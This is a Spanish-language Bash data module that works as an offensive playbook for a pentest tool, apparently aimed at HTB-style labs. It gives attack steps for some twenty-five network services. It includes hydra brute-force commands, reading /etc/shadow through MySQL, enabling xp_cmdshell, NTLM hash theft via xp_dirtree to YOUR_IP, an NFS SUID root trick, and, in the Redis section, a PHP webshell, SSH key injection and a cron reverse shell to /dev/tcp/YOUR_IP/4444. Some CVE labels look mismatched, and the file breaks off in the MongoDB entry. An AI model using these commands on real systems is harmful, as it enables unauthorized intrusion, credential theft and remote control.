#!/bin/bash
# ============================================================
# services.sh - Base de conocimiento de servicios (Libreria)
#
# Que hace: documenta 42+ servicios con pasos, herramientas,
#   vulnerabilidades, dificultad y descripcion para el reporte
#   guiado. Detecta el servicio/producto/version de un puerto
#   a partir del XML de nmap.
#
# Exporta (se sourcea desde SMOKEME.sh):
#   Arrays    : SVC_STEPS, SVC_TOOLS, SVC_VULNS,
#               SVC_DIFFICULTY, SVC_DESCRIPTION
#   Funciones : get_service_info <puerto> -> SVC/PROD/VER_INFO
#
# No es ejecutable por si sola; es un modulo de datos.
# ============================================================

declare -gA SVC_STEPS
declare -gA SVC_TOOLS
declare -gA SVC_VULNS
declare -gA SVC_DIFFICULTY
declare -gA SVC_DESCRIPTION

# ------------------------------------------------------------
# SSH
# ------------------------------------------------------------
SVC_DESCRIPTION[ssh]="Secure Shell - Acceso remoto encriptado"
SVC_DIFFICULTY[ssh]="Facil-Media"
SVC_TOOLS[ssh]="hydra medusa patator ncrack ssh linpeas"
SVC_STEPS[ssh]="
PASO 1 - ENUMERACION INICIAL:
  nmap --script ssh-auth-methods,ssh2-enum-algos,ssh-hostkey -p PORT TARGET
  # Esto revela: metodos de auth permitidos, algoritmos, hostkey

PASO 2 - ENUMERACION DE USUARIOS:
  # Permutaciones del hostname como usuario
  # Ejemplo: target.htb -> target, administrator, admin, svc_*
  # Busca en otros servicios (HTTP, SMB, FTP) nombres de usuario
  # Si encontras web: busca en source, comments, robots.txt

PASO 3 - BRUTE FORCE:
  hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4
  # Si tenes usuarios de otros servicios, pruebalos aca
  # Intenta contraseñas relacionadas con el hostname/empresa

PASO 4 - SI OBTENES CREDS:
  ssh <user>@TARGET
  # Encontra SUID: find / -perm -4000 2>/dev/null
  # Encontra cron jobs: cat /etc/crontab
  # Sube linpeas.sh para mas recon

PASO 5 - MOVIMIENTO LATERAL:
  # Si encontras hash SSH en archivos: crackearlo con hashcat
  # Si hay claves privadas: chmod 600 id_rsa && ssh -i id_rsa user@TARGET
  # Busca configs: cat ~/.ssh/config
"
SVC_VULNS[ssh]="
  CVE-2018-15473    | Username enumeration | OpenSSH < 7.7
  CVE-2023-38408    | Agent forwarding RCE | OpenSSH < 9.3p2
  CVE-2006-5051     | Race condition RCE  | OpenSSH < 4.3p2
  Root login sin password puede estar habilitado
  Claves SSH debiles o reutilizadas
"

# ------------------------------------------------------------
# FTP
# ------------------------------------------------------------
SVC_DESCRIPTION[ftp]="File Transfer Protocol - Transferencia de archivos"
SVC_DIFFICULTY[ftp]="Facil"
SVC_TOOLS[ftp]="hydra medusa ftp ncftp wget curl"
SVC_STEPS[ftp]="
PASO 1 - LOGIN ANONIMO (lo primero que debes probar):
  ftp anonymous@TARGET
  # Si entra, lista TODO: ls -laR
  # Descarga archivos: get <archivo>
  # Verifica si podes escribir: put archivo.txt
  # Busca archivos .conf, .bak, passwd, shadow

PASO 2 - ENUMERACION:
  nmap --script ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p PORT TARGET
  # Esto detecta version y backdoors conocidas

PASO 3 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://TARGET -t 4
  # Usuarios comunes: admin, administrator, ftp, user, test

PASO 4 - SI OBTENES ACCESO:
  # Enumera directorios: ls -la, find / -readable
  # Busca archivos SUID, configs sensibles
  # Si podes escribir: sube reverse shell
  # Busca info para pivoting a otros servicios

PASO 5 - OFFensive:
  # Si ves archivos de config con credenciales
  # Si hay backup files (.bak, .old, .sql)
  # Si hay hashes o passwords en archivos de texto
"
SVC_VULNS[ftp]="
  CVE-2011-2523    | Vsftpd 2.3.4 backdoor      | RCE remoto
  CVE-2015-3306    | ProFTPD 1.3.5 backdoor      | RCE remoto
  CVE-2019-12815   | ProFTPD 1.3.6               | RCE via mod_copy
  CVE-2017-7949    | ProFTPD < 1.3.6b            | SQL injection
  FTP anónimo permite acceso total al filesystem
  Credenciales transmitidas en texto plano (sin TLS)
"

# ------------------------------------------------------------
# HTTP
# ------------------------------------------------------------
SVC_DESCRIPTION[http]="HTTP Web Server - Servidor web"
SVC_DIFFICULTY[http]="Variable (depende de la app)"
SVC_TOOLS[http]="gobuster nikto dirb wfuzz ffuf whatweb curl nmap httpx"
SVC_STEPS[http]="
PASO 1 - RECONOCIMIENTO INICIAL:
  whatweb TARGET
  curl -v -I http://TARGET
  # Mira headers: Server, X-Powered-By, Set-Cookie
  # Busca: titulo, tecnologias, framework

PASO 2 - FUZZING DE DIRECTORIOS (CRITICO):
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 50
  # Si sos root, usa la wordlist grande:
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

PASO 3 - FUZZING CON EXTENSIONES:
  gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,old,zip,conf
  # Busca archivos de backup y configuracion

PASO 4 - FUZZING DE PARAMETROS:
  # Si encontras un form o parametro:
  wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://TARGET/FUZZ
  ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404

PASO 5 - ANALISIS PROFUNDO:
  curl http://TARGET/robots.txt
  curl http://TARGET/sitemap.xml
  curl http://TARGET/.htaccess
  curl http://TARGET/.env
  curl http://TARGET/wp-config.php.bak
  nikto -h http://TARGET
  # Busca: source code, comments, API endpoints, debug pages

PASO 6 - SI ENCONTRAS APLICACION:
  # Identifica: framework, version, lenguaje
  # Busca exploit para esa version exacta
  # SQLi: sqlmap -u 'http://TARGET/page?id=1' --dbs
  # LFI: prueba /etc/passwd, /proc/self/environ
  # RFI: prueba http://tu-servidor/shell.txt
  # Upload: busca subida de archivos
"
SVC_VULNS[http]="
  Directorios ocultos con informacion sensible
  Archivos backup expuestos (.bak, .old, .swp, .sql)
  /admin/, /wp-admin/, /phpmyadmin/, /phpinfo.php
  Headers revelan version y tecnologias
  SQL Injection en formularios y parametros
  LFI/RFI en includes
  Command Injection en forms
  SSRF en parametros de URL
  XML External Entity (XXE)
  Server Side Template Injection (SSTI)
"

# ------------------------------------------------------------
# HTTPS
# ------------------------------------------------------------
SVC_DESCRIPTION[https]="HTTPS - HTTP sobre TLS/SSL"
SVC_DIFFICULTY[https]="Media"
SVC_TOOLS[https]="sslscan sslyze nikto gobuster curl openssl"
SVC_STEPS[https]="
PASO 1 - SSL/TLS SCAN:
  sslscan TARGET:443
  sslyze --regular TARGET
  # Busca: TLS version, cipher suites, certificado

PASO 2 - CERTIFICADO:
  openssl s_client -connect TARGET:443 -servername TARGET
  # Mira: issuer, validity, SAN, chain

PASO 3 - FUZZING (mismo que HTTP pero con https):
  gobuster dir -u https://TARGET/ -w /usr/share/wordlists/dirb/common.txt -k -t 50
  nikto -h https://TARGET
  # -k ignora errores SSL autofirmados

PASO 4 - VULNS TLS:
  # Heartbleed: nmap --script ssl-heartbleed -p 443 TARGET
  # POODLE: nmap --script ssl-poodle -p 443 TARGET
  # Beast: nmap --script ssl-beast -p 443 TARGET
"
SVC_VULNS[https]="
  CVE-2014-0160    | Heartbleed            | Memory leak masivo
  CVE-2014-3566    | POODLE                | downgrade attack
  CVE-2011-3389    | BEAST                 | HTTPS cookie theft
  CVE-2015-0204    | FREAK                 | export-grade crypto
  TLS 1.0/1.1 habilitado (deprecado)
  Certificados autofirmados o expirados
  Cipher suites debiles (RC4, DES, NULL)
"

# ------------------------------------------------------------
# SMB
# ------------------------------------------------------------
SVC_DESCRIPTION[smb]="Server Message Block - Comparticion de archivos Windows"
SVC_DIFFICULTY[smb]="Facil-Media"
SVC_TOOLS[smb]="smbclient enum4linux smbmap crackmapexec nmap nbtscan rpcclient"
SVC_STEPS[smb]="
PASO 1 - ENUMERACION BASICA (siempre hacer):
  smbclient -L //TARGET/ -N
  # -N = sin password (null session)
  # Mira los shares: si hay C$, D$, IPC$, ADMIN$ = Windows server

PASO 2 - ENUMERACION COMPLETA:
  enum4linux -a TARGET
  # Esto da: shares, usuarios, group policies, password policy
  smbmap -H TARGET -R
  # SMBMap lista recursively todos los archivos

PASO 3 - NULL SESSION:
  smbclient //TARGET/IPC$ -N
  rpcclient -U '' -N TARGET
  # Dentro de rpcclient: enumdomusers, enumdomgroups, enumprivs

PASO 4 - SI ENCONTRAS SHARE ACCESIBLE:
  smbclient //TARGET/<share> -N
  # ls -la, cd a directorios, get archivos
  # Busca: config files, scripts, passwords, hashes

PASO 5 - SI TIENES CREDS:
  crackmapexec smb TARGET -u <user> -p <pass> --shares
  crackmapexec smb TARGET -u <user> -p <pass> -M spider-plus
  # Spider-plus enumera todos los archivos de todos los shares

PASO 6 - OFFENSIVE:
  # Si es Windows vulnerable: ms17-010, ms08-067
  # Si hay ASREPRoast: impacket-GetNPUsers.py domain/ -usersfile users.txt -format hashcat
  # Si hay Kerberoasting: impacket-GetUserSPNs.py domain/<user>:<pass> -request
"
SVC_VULNS[smb]="
  CVE-2017-0144    | EternalBlue (MS17-010) | RCE remoto
  CVE-2008-4250    | MS08-067 Conficker      | RCE remoto
  CVE-2017-7494    | Samba                    | RCE (Linux)
  CVE-2021-34527   | PrintNightmare           | RCE via spooler
  CVE-2020-1472    | Zerologon                | DC compromise
  SMBv1 habilitado = vulnerable a NTLM relay
  Null session permite enumeracion completa
  Shares con permisos excesivos
"

# ------------------------------------------------------------
# MICROSOFT-DS (igual que SMB)
# ------------------------------------------------------------
SVC_DESCRIPTION[microsoft-ds]="Microsoft-DS (SMB sobre puerto 445)"
SVC_DIFFICULTY[microsoft-ds]="Facil-Media"
SVC_TOOLS[microsoft-ds]="smbclient enum4linux smbmap crackmapexec nmap"
SVC_STEPS[microsoft-ds]="${SVC_STEPS[smb]}"
SVC_VULNS[microsoft-ds]="${SVC_VULNS[smb]}"

# ------------------------------------------------------------
# NETBIOS-SSN
# ------------------------------------------------------------
SVC_DESCRIPTION[netbios-ssn]="NetBIOS Session Service (SMB sobre puerto 139)"
SVC_DIFFICULTY[netbios-ssn]="Facil"
SVC_TOOLS[netbios-ssn]="nbtscan enum4linux smbclient nmap"
SVC_STEPS[netbios-ssn]="
PASO 1 - NETBIOS SCAN:
  nbtscan -r TARGET
  # Revela: nombre NetBIOS, dominio, MAC address

PASO 2 - ENUMERACION:
  nmblookup -A TARGET
  enum4linux TARGET
  # Busca: nombre del equipo, dominio, usuarios

PASO 3 - RELAY ATTACKS:
  # Si SMB signing esta deshabilitado
  # nmap --script smb-security-mode -p 139,445 TARGET
  # Responder + ntlmrelayx para NTLM relay
"
SVC_VULNS[netbios-ssn]="
  Informacion de NetBIOS expuesta (nombre, dominio)
  Posible NTLM relay si signing esta deshabilitado
  SMB signing: force/disable = vulnerable
"

# ------------------------------------------------------------
# MYSQL
# ------------------------------------------------------------
SVC_DESCRIPTION[mysql]="MySQL/MariaDB - Base de datos SQL"
SVC_DIFFICULTY[mysql]="Facil-Media"
SVC_TOOLS[mysql]="hydra medusa mysql mariadb nmap"
SVC_STEPS[mysql]="
PASO 1 - ENUMERACION:
  nmap --script mysql-info,mysql-enum,mysql-empty-password -p PORT TARGET
  # Detecta: version, usuarios sin password

PASO 2 - CREDS POR DEFECTO:
  mysql -h TARGET -u root -p
  mysql -h TARGET -u root -p ''
  mysql -h TARGET -u admin -p admin
  # Prueba combinaciones: root:root, root:toor, root:mysql

PASO 3 - BRUTE FORCE:
  hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://TARGET -t 4
  hydra -l admin -P /usr/share/wordlists/rockyou.txt mysql://TARGET -t 4

PASO 4 - SI OBTENES ACCESO:
  # Info del server: SELECT version();
  # Usuarios: SELECT user,authentication_string FROM mysql.user;
  # Databases: SHOW databases; USE <db>; SHOW tables;
  # Lectura archivos: LOAD_FILE('/etc/passwd')
  # Lectura archivos: SELECT LOAD_FILE('/etc/shadow')

PASO 5 - ESCALADA:
  # Si UDF habilitado: CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
  # Si FILE privilege: escribir webshell en directorio web
  # Si hay linked servers o replication
"
SVC_VULNS[mysql]="
  CVE-2009-1653    | UDF privilege escalation
  CVE-2012-5615   | Oracle MySQL < 5.5.54
  Root sin password o password vacio
  LOAD_FILE() para lectura任意 de archivos
  FILE privilege permite escritura a disco
  UDF para ejecucion de comandos del sistema
"

# ------------------------------------------------------------
# MSSQL
# ------------------------------------------------------------
SVC_DESCRIPTION[mssql]="Microsoft SQL Server"
SVC_DIFFICULTY[mssql]="Media"
SVC_TOOLS[mssql]="hydra medusa impacket-mssqlclient sqsh sqlcmd nmap"
SVC_STEPS[mssql]="
PASO 1 - ENUMERACION:
  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info -p PORT TARGET
  # Detecta: version, instance name, si tiene credenciales vacias

PASO 2 - CREDS POR DEFECTO:
  impacket-mssqlclient sa:@TARGET -windows-auth
  impacket-mssqlclient sa:password@TARGET
  # Prueba: sa:'', sa:sa, sa:password, sa:Password1

PASO 3 - BRUTE FORCE:
  hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://TARGET -t 4
  # SA es el superadmin, siempre intentalo

PASO 4 - SI OBTENES ACCESO:
  # Enum databases: SELECT name FROM sys.databases;
  # USE <db>; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
  # xp_cmdshell: EXEC xp_cmdshell 'whoami';
  # Si xp_cmdshell esta deshabilitado, habilitalo:
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

PASO 5 - OFFENSIVE:
  # Roba hashes NTLM: xp_dirtree '\\YOUR_IP\share'
  # Con impacket responder: impacket-ntlmrelayx -tf targets.txt -smb2support
  # Si tienes sysadmin: RCE total via xp_cmdshell
"
SVC_VULNS[mssql]="
  SA account con password default o vacio
  xp_cmdshell habilitado = RCE total
  xp_dirtree para NTLM relay/robear hashes
  CVE-2019-1357  | SQL Server RCE
  Linked servers para movimiento lateral
"

# ------------------------------------------------------------
# POSTGRESQL
# ------------------------------------------------------------
SVC_DESCRIPTION[postgresql]="PostgreSQL - Base de datos SQL"
SVC_DIFFICULTY[postgresql]="Facil-Media"
SVC_TOOLS[postgresql]="hydra medusa psql nmap"
SVC_STEPS[postgresql]="
PASO 1 - ENUMERACION:
  nmap --script pgsql-brute -p PORT TARGET

PASO 2 - CREDS POR DEFECTO:
  psql -h TARGET -U postgres
  psql -h TARGET -U postgres -W
  # Prueba: postgres:postgres, postgres:password

PASO 3 - BRUTE FORCE:
  hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://TARGET -t 4

PASO 4 - SI OBTENES ACCESO:
  # Databases: \l
  # Tablas: \c <db>; \dt
  # Leer archivos: SELECT pg_read_file('/etc/passwd');
  # Listing directorios: SELECT pg_ls_dir('/etc');
  # Extensions: SELECT * FROM pg_extension;
  # Si plpythonu: CREATE LANGUAGE plpythonu;
"
SVC_VULNS[postgresql]="
  Credenciales por defecto (postgres:postgres)
  Extensiones peligrosas: plpythonu, plperlu, pltclu
  pg_read_file() para lectura任意 de archivos
  CVE-2019-9193  | COPY FROM PROGRAM = RCE (PostgreSQL 9.3-11.6)
  CVE-2020-14349 | Privilege escalation via default grants
"

# ------------------------------------------------------------
# RDP
# ------------------------------------------------------------
SVC_DESCRIPTION[rdp]="Remote Desktop Protocol - Escritorio remoto Windows"
SVC_DIFFICULTY[rdp]="Media"
SVC_TOOLS[rdp]="hydra ncrack xfreerdp rdesktop nmap crowbar"
SVC_STEPS[rdp]="
PASO 1 - ENUMERACION:
  nmap --script rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info -p PORT TARGET
  # Revela: cifrado soportado, si es vulnerable, NTLM info

PASO 2 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt rdp://TARGET -t 1
  # RDP es lento, usa -t 1 para evitar lockouts
  crowbar -b rdp -s TARGET/32 -u <user> -C /usr/share/wordlists/rockyou.txt

PASO 3 - SI OBTENES CREDS:
  xfreerdp /u:<user> /p:<pass> /v:TARGET /dynamic-resolution
  # Con discos compartidos:
  xfreerdp /u:<user> /p:<pass> /v:TARGET /drive:share,/tmp
  # Con clipboard:
  xfreerdp /u:<user> /p:<pass> /v:TARGET +clipboard

PASO 4 - PIVOTING:
  # Si tienes RDP, puedes usarlo como pivote
  # via ssh tunnel o proxychains
"
SVC_VULNS[rdp]="
  CVE-2019-0708   | BlueKeep         | RCE sin autenticar
  CVE-2019-1181   | DejaBlue         | RCE sin autenticar
  CVE-2012-0002   | MS12-020         | DoS
  NLA deshabilitado permite acceso sin credenciales
  Credenciales guardadas en disco (mimikatz las extrae)
  RDP Token impersonation
"

# ------------------------------------------------------------
# SMTP
# ------------------------------------------------------------
SVC_DESCRIPTION[smtp]="Simple Mail Transfer Protocol - Envio de email"
SVC_DIFFICULTY[smtp]="Facil"
SVC_TOOLS[smtp]="telnet nc swaks smtp-user-enum nmap"
SVC_STEPS[smtp]="
PASO 1 - ENUMERACION:
  nmap --script smtp-enum-users,smtp-open-relay -p PORT TARGET
  # Detecta: usuarios, si es open relay

PASO 2 - ENUMERACION DE USUARIOS:
  telnet TARGET 25
  # HELO test
  # VRFY root
  # VRFY admin
  # EXPN root
  # Si VRFY/EXPN responden, puedes enumerar usuarios

PASO 3 - SWAKS (test completo):
  swaks --to test@target.com --from fake@fake.com --server TARGET
  # Si funciona = open relay = puedes enviar phishing

PASO 4 - OFFENSIVE:
  # Open relay para phishing
  # Enumerar usuarios para brute force en otros servicios
  # Busca dominio: MX records con dig
"
SVC_VULNS[smtp]="
  CVE-2020-7247   | OpenSMTPD < 6.6.2 | RCE
  CVE-2019-13327 | Exim < 4.92.1     | RCE
  Enumeracion de usuarios via VRFY/EXPN
  Open relay para phishing
  Credenciales en texto plano si sin STARTTLS
"

# ------------------------------------------------------------
# POP3
# ------------------------------------------------------------
SVC_DESCRIPTION[pop3]="Post Office Protocol v3 - Recepcion de email"
SVC_DIFFICULTY[pop3]="Facil"
SVC_TOOLS[pop3]="hydra telnet nc"
SVC_STEPS[pop3]="
PASO 1 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt pop3://TARGET -t 4

PASO 2 - CONEXION DIRECTA:
  nc TARGET 110
  # USER <usuario>
  # PASS <password>
  # LIST (lista emails)
  # RETR 1 (lee email 1)
  # TOP 1 100 (cabecera del email 1)

PASO 3 - SI OBTENES ACCESO:
  # Busca emails con: credenciales, passwords, tokens
  # Descarga todos los emails
  # Busca adjuntos
"
SVC_VULNS[pop3]="
  POP3 sin TLS = credenciales en texto plano
  Dovecot/Courier versiones antiguas con vulnerabilities
  Emails pueden contener credenciales sensibles
"

# ------------------------------------------------------------
# IMAP
# ------------------------------------------------------------
SVC_DESCRIPTION[imap]="Internet Message Access Protocol - Acceso a email"
SVC_DIFFICULTY[imap]="Facil"
SVC_TOOLS[imap]="hydra telnet nc curl"
SVC_STEPS[imap]="
PASO 1 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt imap://TARGET -t 4

PASO 2 - CONEXION:
  nc TARGET 143
  a001 LOGIN <user> <pass>
  a002 LIST \"\" *
  a003 SELECT INBOX
  a004 FETCH 1 BODY

PASO 3 - SI OBTENES ACCESO:
  # Busca emails: contratos, credenciales, tokens
  # Mira carpetas: Sent, Drafts, Trash
  # Busca adjuntos: archivos .docx, .pdf, .key
"
SVC_VULNS[imap]="
  IMAP sin TLS/SSL
  Credenciales en texto plano
  Emails con informacion sensible
"

# ------------------------------------------------------------
# TELNET
# ------------------------------------------------------------
SVC_DESCRIPTION[telnet]="Telnet - Acceso remoto sin cifrado"
SVC_DIFFICULTY[telnet]="Facil"
SVC_TOOLS[telnet]="hydra telnet nc tcpdump wireshark"
SVC_STEPS[telnet]="
PASO 1 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt telnet://TARGET -t 4

PASO 2 - INTERCEPTACION:
  tcpdump -i eth0 port 23 -A
  # Telnet envia TODO en texto plano, incluyendo passwords
  # Si estas en la misma red, captura el trafico

PASO 3 - CONEXION:
  telnet TARGET
  # Prueba: admin:admin, root:root, admin:password
"
SVC_VULNS[telnet]="
  TODOS los datos en texto plano (passwords visibles)
  Interceptacion de credenciales trivial
  Buffer overflow en daemon telnet antiguos
"

# ------------------------------------------------------------
# DNS
# ------------------------------------------------------------
SVC_DESCRIPTION[dns]="Domain Name System - Resolucion de nombres"
SVC_DIFFICULTY[dns]="Facil-Media"
SVC_TOOLS[dns]="dig host nslookup dnsenum dnsrecon fierce nmap"
SVC_STEPS[dns]="
PASO 1 - ZONE TRANSFER (si es authoritative):
  dig axfr @TARGET domain.htb
  dig axfr @TARGET .  (para zone root)
  # Si funciona = information disclosure total

PASO 2 - ENUMERACION:
  dnsenum domain.htb --dnsserver TARGET
  dnsrecon -d domain.htb -n TARGET
  fierce --dns-servers TARGET --domain domain.htb

PASO 3 - SUBDOMINIOS:
  gobuster dns -d domain.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r TARGET -t 50
  # Busca subdominios internos que pueden tener servicios expuestos

PASO 4 - RECORDS:
  dig ANY @TARGET domain.htb
  dig AXFR @TARGET domain.htb
  dig TXT @TARGET domain.htb
  # TXT records pueden contener passwords o tokens
"
SVC_VULNS[dns]="
  Zone transfer habilitado (information disclosure total)
  DNS cache poisoning
  Subdominios ocultos con servicios internos
  TXT records con información sensible
  DNS amplification attack vector
"

# ------------------------------------------------------------
# SNMP
# ------------------------------------------------------------
SVC_DESCRIPTION[snmp]="Simple Network Management Protocol"
SVC_DIFFICULTY[snmp]="Facil"
SVC_TOOLS[snmp]="snmpwalk snmp-check onesixtyone hydra nmap"
SVC_STEPS[snmp]="
PASO 1 - COMMUNITY STRINGS:
  onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET
  # Fuerza bruta de community strings

PASO 2 - SI ENCONTRAS COMMUNITY STRING:
  snmpwalk -v2c -c public TARGET
  snmp-check -c public TARGET
  # Revela: interfaces, rutas, usuarios, procesos, software

PASO 3 - BRUTE FORCE:
  hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt snmp://TARGET

PASO 4 - OFFENSIVE:
  # Si community string 'private': puedes escribir configs
  # Busca passwords en OIDs
  # snmpwalk -v2c -c public TARGET | grep -i pass
"
SVC_VULNS[snmp]="
  Community string 'public' por defecto
  SNMPv1/v2c sin autenticar
  'private' permite escritura
  Expone: interfaces, rutas, usuarios, procesos
  Puede revelar passwords en configs
"

# ------------------------------------------------------------
# VNC
# ------------------------------------------------------------
SVC_DESCRIPTION[vnc]="Virtual Network Computing - Escritorio remoto"
SVC_DIFFICULTY[vnc]="Facil"
SVC_TOOLS[vnc]="hydra vncviewer nmap"
SVC_STEPS[vnc]="
PASO 1 - ENUMERACION:
  nmap --script vnc-info,vnc-brute -p PORT TARGET
  # Detecta: autenticacion, version

PASO 2 - BRUTE FORCE:
  hydra -P /usr/share/wordlists/rockyou.txt vnc://TARGET
  # VNC no tiene usuario, solo password

PASO 3 - CONEXION:
  vncviewer TARGET:PORT
  # Si pide password, es el brute force anterior
"
SVC_VULNS[vnc]="
  VNC sin autenticar o password vacio
  VNC sin TLS = datos en texto plano
  RealVNC < 6.0.0: multiples vulnerabilidades
"

# ------------------------------------------------------------
# NFS
# ------------------------------------------------------------
SVC_DESCRIPTION[nfs]="Network File System - Sistema de archivos remoto"
SVC_DIFFICULTY[nfs]="Facil-Media"
SVC_TOOLS[nfs]="showmount mount nmap rpcclient"
SVC_STEPS[nfs]="
PASO 1 - ENUMERACION:
  showmount -e TARGET
  nmap --script nfs-showmount,nfs-ls,nfs-statfs -p PORT TARGET
  # Lista shares exportados

PASO 2 - MOUNT:
  mkdir -p /mnt/nfs
  mount -t nfs TARGET:/<share> /mnt/nfs -o nolock
  ls -la /mnt/nfs

PASO 3 - SI ROOT SQUASHING DESHABILITADO:
  # Crea archivos como root
  # cp /bin/bash /mnt/nfs/rootbash
  # chmod +s /mnt/nfs/rootbash
  # Ejecuta en el target: ./rootbash -p

PASO 4 - OFFENSIVE:
  # Busca SUID bins en el share
  # Busca archivos .ssh, .bash_history, configs
  # Si puedes escribir: crontab injection, SSH key injection
"
SVC_VULNS[nfs]="
  Root squashing deshabilitado = RCE
  Archivos sensibles en shares exportados
  No_auth en NFSv3
  Permisos excesivos en shares
"

# ------------------------------------------------------------
# LDAP
# ------------------------------------------------------------
SVC_DESCRIPTION[ldap]="Lightweight Directory Access Protocol"
SVC_DIFFICULTY[ldap]="Media"
SVC_TOOLS[ldap]="ldapsearch ldapenum nmap windapsearch"
SVC_STEPS[ldap]="
PASO 1 - ANONYMOUS BIND:
  ldapsearch -x -H ldap://TARGET -b '' -s base namingContexts
  # Si funciona = information disclosure

PASO 2 - ENUMERACION:
  ldapsearch -x -H ldap://TARGET -b 'DC=domain,DC=com' '(objectClass=user)' | grep -i 'samAccountName\|mail'
  ldapsearch -x -H ldap://TARGET -b 'DC=domain,DC=com' '(objectClass=group)'
  ldapsearch -x -H ldap://TARGET -b 'DC=domain,DC=com' '(objectClass=*)' | grep -i 'pass'

PASO 3 - ACTIVE DIRECTORY:
  windapsearch -d domain.htb --dc TARGET -U
  # Enumera: usuarios, groups, computers, GPOs

PASO 4 - OFFENSIVE:
  # Busca SPN para Kerberoasting
  # Busca ASREPRoastables
  # Busca delegacion
  # BloodHound: bloodhound-python -d domain.htb -u user -p pass -c All -ns TARGET
"
SVC_VULNS[ldap]="
  LDAP anonymous bind habilitado
  Usuarios y passwords en texto plano (si no hay TLS)
  LDAP injection en web apps
  Active Directory delegation issues
  ASREPRoast / Kerberoasting
"

# ------------------------------------------------------------
# RPC
# ------------------------------------------------------------
SVC_DESCRIPTION[rpc]="Remote Procedure Call"
SVC_DIFFICULTY[rpc]="Facil"
SVC_TOOLS[rpc]="rpcclient nmap enum4linux rpcinfo"
SVC_STEPS[rpc]="
PASO 1 - ENUMERACION:
  nmap --script rpcinfo,rpc-grind -p PORT TARGET
  rpcclient -U '' -N TARGET
  # -N = sin password

PASO 2 - DENTRO DE RPCCLIENT:
  # enumdomusers
  # enumdomgroups
  # enumprivs
  # queryuser <RID>
  # lookupnames <user>

PASO 3 - RID BRUTE FORCE:
  # Empieza por RID 500, 501, 1000...
  for i in \$(seq 500 1100); do rpcclient -U '' -N TARGET -c 'queryuser '\$i 2>/dev/null | grep 'User Name'; done
"
SVC_VULNS[rpc]="
  RPC information disclosure
  Null session permitido
  RID cycling para enumeracion de usuarios
  Mount point information leak
"

# ------------------------------------------------------------
# RSYNC
# ------------------------------------------------------------
SVC_DESCRIPTION[rsync]="rsync - Sincronizacion de archivos"
SVC_DIFFICULTY[rsync]="Facil-Media"
SVC_TOOLS[rsync]="rsync nmap hydra"
SVC_STEPS[rsync]="
PASO 1 - CHECK MODULES:
  rsync TARGET::
  # Lista modulos disponibles

PASO 2 - ENUMERACION:
  rsync -avz --list-only TARGET::<module>/
  # Lista archivos del modulo

PASO 3 - BRUTE FORCE:
  hydra -l <user> -P /usr/share/wordlists/rockyou.txt rsync://TARGET -t 4

PASO 4 - SYNC:
  rsync -avz TARGET::<module>/ ./output/
  # Descarga todo el modulo

PASO 5 - OFFENSIVE:
  # Busca: configs, passwords, SSH keys
  # Si puedes escribir: sube reverse shell
"
SVC_VULNS[rsync]="
  Rsync sin autenticar permite acceso a archivos
  CVE-2018-5764 | Rsync < 3.1.3 info disclosure
  Modulos expuestos con datos sensibles
"

# ------------------------------------------------------------
# REDIS
# ------------------------------------------------------------
SVC_DESCRIPTION[redis]="Redis - Key-value store en memoria"
SVC_DIFFICULTY[redis]="Facil"
SVC_TOOLS[redis]="redis-cli nmap"
SVC_STEPS[redis]="
PASO 1 - CONEXION SIN AUTH:
  redis-cli -h TARGET
  # Si te conectas = no tiene password

PASO 2 - ENUMERACION:
  INFO
  CONFIG GET dir
  CONFIG GET dbfilename
  DBSIZE
  KEYS *

PASO 3 - WEBSHELL VIA REDIS:
  CONFIG SET dir /var/www/html
  CONFIG SET dbfilename shell.php
  SET payload '<?php system($_GET[\"cmd\"]); ?>'
  SAVE
  # Accede: http://TARGET/shell.php?cmd=id

PASO 4 - SSH KEY INJECTION:
  CONFIG SET dir /root/.ssh
  CONFIG SET dbfilename authorized_keys
  SET key 'ssh-rsa AAAA... tu_key ...'
  SAVE
  # ssh -i tu_key root@TARGET

PASO 5 - CRON JOB INJECTION:
  CONFIG SET dir /var/spool/cron/crontabs
  CONFIG SET dbfilename root
  SET cron '*/1 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
  SAVE
"
SVC_VULNS[redis]="
  Redis sin autenticacion por defecto
  Arbitrary file write via CONFIG SET
  SSH key injection
  Cron job injection = RCE
  CVE-2019-10539 | RCE en Redis < 5.0.5
"

# ------------------------------------------------------------
# MONGODB
# ------------------------------------------------------------
SVC_DESCRIPTION[mongodb]="MongoDB - Base de datos NoSQL"
SVC_DIFFICULTY[mongodb]="Facil"
SVC_TOOLS[mongodb]="mongosh mongodump nmap"
SVC_STEPS[mongodb]="
PASO 1 - CONEXION:
  mongosh TARGET:27017
  # o: mongo TARGET:27017

PASO 2 - ENUMERACION:
  show dbs
  use <db>
  show collections
  db.users.find()

PASO 3 - DUMP:
  mongodump --host TARGET
  # Descarga toda la base de datos

PASO 4 - OFFENSIVE:
  # Busca: usuarios, passwords, tokens API
  # db.users.find({},{password:1})
"
SVC_VULNS[mongodb]="
  MongoDB sin autenticacion por defecto
  Datos expuestos sin credenciales
